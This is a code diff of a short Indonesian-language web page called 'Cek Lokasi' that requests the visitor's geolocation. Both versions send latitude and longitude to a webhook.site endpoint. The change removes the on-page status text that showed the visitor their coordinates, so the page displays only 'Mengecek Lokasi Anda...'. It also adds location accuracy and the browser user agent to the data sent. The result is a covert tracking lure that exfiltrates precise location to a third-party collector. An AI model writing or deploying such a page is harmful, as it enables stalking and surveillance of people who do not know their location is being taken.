@@ -1,42 +1,33 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Cek Lokasi</title>
 </head>
 <body>
-  <h1>Memeriksa Lokasi Anda...</h1>
-  <p id="status">Meminta izin lokasi...</p>
-
+  <h1>Mengecek Lokasi Anda...</h1>
   <script>
-    function sendLocation(lat, lon) {
-      // Ganti URL berikut dengan Webhook/endpoint server kamu
-      fetch("https://webhook.site/214bd26c-72f4-412a-bf14-e4a05dbce51f", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          latitude: lat,
-          longitude: lon,
-          timestamp: new Date().toISOString()
-        })
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        fetch("https://webhook.site/214bd26c-72f4-412a-bf14-e4a05dbce51f", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          })
+        });
+      }, function(error) {
+        console.log("Gagal mendapatkan lokasi:", error.message);
       });
-    }
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          document.getElementById("status").textContent = `Lokasi ditemukan: ${lat}, ${lon}`;
-          sendLocation(lat, lon);
-        },
-        (error) => {
-          document.getElementById("status").textContent = "Gagal mendapatkan lokasi: " + error.message;
-        }
-      );
     } else {
-      document.getElementById("status").textContent = "Geolocation tidak didukung di browser ini.";
+      alert("Browser tidak mendukung geolocation.");
     }
   </script>
 </body>
